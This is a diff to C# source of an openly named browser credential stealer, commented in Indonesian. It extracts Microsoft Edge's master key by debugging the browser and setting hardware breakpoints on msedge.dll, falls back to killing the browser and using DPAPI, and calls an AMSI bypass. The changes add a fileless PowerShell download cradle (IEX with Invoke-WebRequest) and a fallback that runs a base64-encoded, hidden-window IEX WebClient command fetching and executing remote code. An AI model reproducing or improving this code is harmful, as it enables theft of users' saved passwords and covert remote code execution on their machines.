@@ -210,7 +210,6 @@ namespace MalwareStealer
                 IntPtr hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pi.dwProcessId);
                 if (hProcess == IntPtr.Zero) return null;
 
-                // ===== DAPETIN BASE ADDRESS MSEDGE.DLL =====
                 IntPtr msedgeBase = IntPtr.Zero;
                 for (int i = 0; i < 50; i++)
                 {
@@ -226,7 +225,6 @@ namespace MalwareStealer
                 }
                 Console.WriteLine("[+] msedge.dll base: 0x" + msedgeBase.ToString("X"));
 
-                // ===== SCAN SELURUH MEMORY UNTUK STRING =====
                 string targetString = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
                 IntPtr stringAddr = FindStringInModule(hProcess, msedgeBase, 0x1000000, targetString);
                 if (stringAddr == IntPtr.Zero)
@@ -236,7 +234,6 @@ namespace MalwareStealer
                 }
                 Console.WriteLine("[+] String ditemukan di: 0x" + stringAddr.ToString("X"));
 
-                // ===== SCAN .TEXT SECTION UNTUK LEA =====
                 IntPtr leaAddr = FindLEAByScan(hProcess, msedgeBase, 0x1000000, stringAddr);
                 if (leaAddr == IntPtr.Zero)
                 {
@@ -245,7 +242,6 @@ namespace MalwareStealer
                 }
                 Console.WriteLine("[+] LEA ditemukan di: 0x" + leaAddr.ToString("X"));
 
-                // ===== PASANG HARDWARE BREAKPOINT =====
                 IntPtr hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, false, (uint)pi.dwThreadId);
                 if (hThread == IntPtr.Zero) return null;
 
@@ -260,7 +256,6 @@ namespace MalwareStealer
 
                 Console.WriteLine("[+] Hardware breakpoint dipasang di: 0x" + leaAddr.ToString("X"));
 
-                // ===== DEBUG LOOP =====
                 DEBUG_EVENT de;
                 int timeout = 30000;
                 int elapsed = 0;
@@ -373,15 +368,16 @@ namespace MalwareStealer
 
         // ===== MODUL 4: FILELESS EXECUTION =====
 
-        // 1. PowerShell Download Cradle (download & execute di memory)
+        // 1. PowerShell Download Cradle (pake Invoke-WebRequest + fallback)
         static void ExecuteDownloadCradle(string url)
         {
             try
             {
                 Console.WriteLine("[+] Menjalankan Download Cradle...");
                 
+                // Method 1: Invoke-WebRequest (lebih aman dari block)
                 string cradle = string.Format(
-                    "IEX (New-Object Net.WebClient).DownloadString('{0}')",
+                    "IEX (Invoke-WebRequest -Uri '{0}').Content",
                     url
                 );
                 
@@ -403,11 +399,45 @@ namespace MalwareStealer
                 Process p = Process.Start(psi);
                 p.WaitForExit(5000);
                 
+                string output = p.StandardOutput.ReadToEnd();
                 Console.WriteLine("[+] Download Cradle selesai.");
+                if (!string.IsNullOrEmpty(output))
+                    Console.WriteLine("[+] Output: " + output.Trim());
             }
             catch (Exception ex)
             {
                 Console.WriteLine("[-] Error: " + ex.Message);
+                // Fallback: pake Net.WebClient dengan User-Agent
+                try
+                {
+                    Console.WriteLine("[+] Mencoba fallback WebClient...");
+                    string cradle = string.Format(
+                        "IEX (New-Object Net.WebClient).DownloadString('{0}')",
+                        url
+                    );
+                    byte[] bytes = Encoding.Unicode.GetBytes(cradle);
+                    string encoded = Convert.ToBase64String(bytes);
+                    
+                    string psCommand = string.Format(
+                        "powershell -nop -w hidden -enc {0}",
+                        encoded
+                    );
+                    
+                    ProcessStartInfo psi = new ProcessStartInfo();
+                    psi.FileName = "powershell.exe";
+                    psi.Arguments = psCommand;
+                    psi.UseShellExecute = false;
+                    psi.CreateNoWindow = true;
+                    psi.RedirectStandardOutput = true;
+                    
+                    Process p = Process.Start(psi);
+                    p.WaitForExit(5000);
+                    Console.WriteLine("[+] Fallback selesai.");
+                }
+                catch (Exception ex2)
+                {
+                    Console.WriteLine("[-] Fallback gagal: " + ex2.Message);
+                }
             }
         }
 
@@ -435,7 +465,7 @@ namespace MalwareStealer
                 p.WaitForExit(5000);
                 
                 string output = p.StandardOutput.ReadToEnd();
-                Console.WriteLine("[+] Output: " + output);
+                Console.WriteLine("[+] Output: " + output.Trim());
             }
             catch (Exception ex)
             {
@@ -500,7 +530,6 @@ namespace MalwareStealer
                             catch { }
                         }
 
-                        // FALLBACK HASH (SHA-256)
                         if (pass == "[[ENCRYPTED]]" || pass == "[[DECRYPT FAILED]]")
                         {
                             try
@@ -532,7 +561,7 @@ namespace MalwareStealer
             Console.ReadKey();
         }
 
-        // ===== MAIN (UPDATED WITH MODULE 4) =====
+        // ===== MAIN (MODUL 3 + 4) =====
         static void Main()
         {
             BypassAMSI();
@@ -546,14 +575,12 @@ namespace MalwareStealer
             // 2. Obfuscated Execution
             ExecuteObfuscated();
             
-            // 3. Stealer (seperti biasa)
+            // 3. Stealer (MODUL 3)
             byte[] masterKey = null;
 
-            // 1. COBA DEBUGGER
             Console.WriteLine("[+] Mencoba debugger bypass...");
             masterKey = ExtractMasterKeyViaDebugger();
 
-            // 2. KALO GAGAL, KILL BROWSER + DPAPI
             if (masterKey == null)
             {
                 Console.WriteLine("[+] Debugger gagal, mencoba kill browser + DPAPI...");
